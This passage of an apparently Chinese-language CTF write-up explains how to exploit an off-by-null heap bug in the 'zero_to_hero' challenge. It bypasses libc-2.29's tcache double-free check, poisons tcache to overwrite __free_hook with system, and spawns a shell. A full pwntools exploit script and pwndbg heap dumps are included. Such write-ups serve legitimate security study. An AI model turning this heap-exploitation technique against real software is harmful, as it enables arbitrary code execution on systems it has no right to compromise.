      if ( v1 > 6 )
      {
        puts("Invalid index!");
        exit(-1);
      }
      free(qword_602060[v1]);
      return __readfsqword(0x28u) ^ v2;
    }
漏洞二：写入description时，如果字符串长度等于输入的size，`str[size]`会写\x00，存在off by null。
    unsigned __int64 add()
    {
      _BYTE *v0; // rbx
      size_t size; // [rsp+0h] [rbp-20h]
      unsigned __int64 v3; // [rsp+8h] [rbp-18h]
      v3 = __readfsqword(0x28u);
      LODWORD(size) = 0;
      HIDWORD(size) = sub_4009C2();
      if ( (size & 0x8000000000000000LL) != 0LL )
      {
        puts("You have too many powers!");
        exit(-1);
      }
      puts("Describe your new power.");
      puts("What is the length of your description?");
      printf("> ", size);
      __isoc99_scanf("%u", &size);
      getchar();
      if ( (unsigned int)size > 0x408 )
      {
        puts("Power too strong!");
        exit(-1);
      }
      qword_602060[SHIDWORD(size)] = malloc((unsigned int)size);
      puts("Enter your description: ");
      printf("> ", &size, size);
      v0 = qword_602060[SHIDWORD(size)];
      v0[read(0, qword_602060[SHIDWORD(size)], (unsigned int)size)] = 0; // off by null
      puts("Done!");
      return __readfsqword(0x28u) ^ v3;
    }
题目还有一点限制，申请内存最大不超过0x408，也就是不超过tcache在64位的大小，并且最多只能创建7个chunk，因此只够刚好填满tcache，没办法利用到fastbins。
攻击流程思考：首先，这个程序没有UAF，因此上面提到的第一个绕过思路在这里行不通。题目存在off by
null，刚好满足思路2的最低要求，而且free后没清空指针，可以直接触发double free。那么思路很明确了，通过off by
null对下一个chunk的size复写最低位，修改chunk的大小，从而绕过libc-2.29的double free检测，由于题目开了`Full
RELRO`，可以通过修改`__free_hook`为one_gadget或system进行getshell。下面开始构造exp。
  * 程序开头会询问`you want to be a hero?`，直接回复y就好了，然后非常友好地提供了system的运行地址，提取后计算出libc基址即可。
    p.sendlineafter('hero?','y')
    p.recvuntil(': ')
    system = int(p.recvline().strip(), 16)
    libc.address = system - libc.symbols['system']
    success("libc.addres : {:#x}".format(libc.address))
  * 然后创建两个大小不同的chunk，分别为0x58和0x100。前面一个chunk需要申请`0x10*n+8`的大小，要让这个chunk最后8字节跟下一个chunk的size连接上。而下一个chunk的大小要大于0x100且大小不为0x100整数倍，因为我们只有off by null，要确保最低位写0后，size不为0且大小改变。
    add(0x58, '0000') # Chunk 0
    add(0x100, '1111') # Chunk 1
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk
    0xe28000            0x0                 0x250                Used                None              None
    0xe28250            0x0                 0x60                 Used                None              None
    0xe282b0            0x0                 0x110                Used                None              None
  * 依次free掉这两个chunk，其中1号chunk进入了0x110大小的tcache。
    free(0) # 0x60 tcache
    free(1) # 0x110 tcache
可以看到两个chunk的bk，均写入了tcache_perthread_struct的地址。
    pwndbg> bins
    tcachebins
    0x60 [  1]: 0xe28260 ◂— 0x0
    0x110 [  1]: 0xe282c0 ◂— 0x0
    pwndbg> x/50gx 0xe28260-0x10
    0xe28250:       0x0000000000000000      0x0000000000000061
    0xe28260:       0x0000000000000000      0x0000000000e28010
    0xe28270:       0x0000000000000000      0x0000000000000000
    0xe28280:       0x0000000000000000      0x0000000000000000
    0xe28290:       0x0000000000000000      0x0000000000000000
    0xe282a0:       0x0000000000000000      0x0000000000000000
    0xe282b0:       0x0000000000000000      0x0000000000000111
    0xe282c0:       0x0000000000000000      0x0000000000e28010
    0xe282d0:       0x0000000000000000      0x0000000000000000
    0xe282e0:       0x0000000000000000      0x0000000000000000
  * 重新创建一个0x58大小的chunk，利用off by null，将下一个chunk的size由0x111改成0x100。这里还提前放好`/bin/sh\x00`，方便后面getshell。
    ## off by null
    add(0x58, '/bin/sh\x00' + '0'*0x50) # Chunk 0
    pwndbg> x/50gx 0xe28260-0x10
    0xe28250:       0x0000000000000000      0x0000000000000061
    0xe28260:       0x0068732f6e69622f      0x3030303030303030
    0xe28270:       0x3030303030303030      0x3030303030303030
    0xe28280:       0x3030303030303030      0x3030303030303030
    0xe28290:       0x3030303030303030      0x3030303030303030
    0xe282a0:       0x3030303030303030      0x3030303030303030
    0xe282b0:       0x3030303030303030      0x0000000000000100
    0xe282c0:       0x0000000000000000      0x0000000000e28010
    0xe282d0:       0x0000000000000000      0x0000000000000000
  * 现在，chunk 1的size已经变成0x100，由于0x100大小的tcache并无chunk，再次free此chunk并不会产生报错。因为指针没清空，我们直接再次删除chunk 1即可。
    ## double free
    free(1)
此时chunk 1分别进入了0x100和0x110大小的tcache
    pwndbg> bins
    tcachebins
    0x100 [  1]: 0xe282c0 ◂— 0x0
    0x110 [  1]: 0xe282c0 ◂— 0x0
  * 然后就是正常的tcache poisoning流程，首先申请一个0x110大小的chunk，然后写入`__free_hook`的地址，相当于修改了0x100大小的chunk的fd。申请两次0x100大小的chunk就可以修改`__free_hook`。
    ## tcache poisoning
    add(0x100, p64(libc.sym['__free_hook']))
    add(0xf0, '1234')
    add(0xf0, p64(libc.sym['system']))
    pwndbg> bins
    tcachebins
    0x100 [  1]: 0xe282c0 —▸ 0x7f3758dc28c8 (__free_hook) ◂— ...
  * 最后，free掉之前预备的chunk 0，里面为`/bin/sh\x00`，即可getshell。
完整EXP：
    # coding:utf-8
    from pwn import *
    context.log_level = 'DEBUG'
    target = 'zero_to_hero'  
    elf = ELF('./'+target)
    context.binary = './'+target
    p = process('./'+target)
    libc = ELF('./libc.so.6')
    def add(size, content):
        p.sendlineafter('> ', '1')
        p.sendlineafter('> ', str(size))
        p.sendafter('> ', content)
    def free(idx):
        p.sendlineafter('> ', '2')
        p.sendlineafter('> ', str(idx))
    p.sendlineafter('hero?','y')
    ## leak address
    p.recvuntil(': ')
    system = int(p.recvline().strip(), 16)
    libc.address = system - libc.symbols['system']
    success("libc.addres : {:#x}".format(libc.address))
    add(0x58, '0000') # Chunk 0
    add(0x100, '1111') # Chunk 1
    free(0) 
    free(1) 
    ## off by null
    add(0x58, '/bin/sh\x00' + '0'*0x50) # Chunk 0
    ## double free
    free(1)
    ## tcache poisoning
    add(0x100, p64(libc.sym['__free_hook']))
    add(0xf0, '1234')
    add(0xf0, p64(libc.sym['system']))
    ## getshell
    free(0)
    p.interactive()
    p.close()
## 参考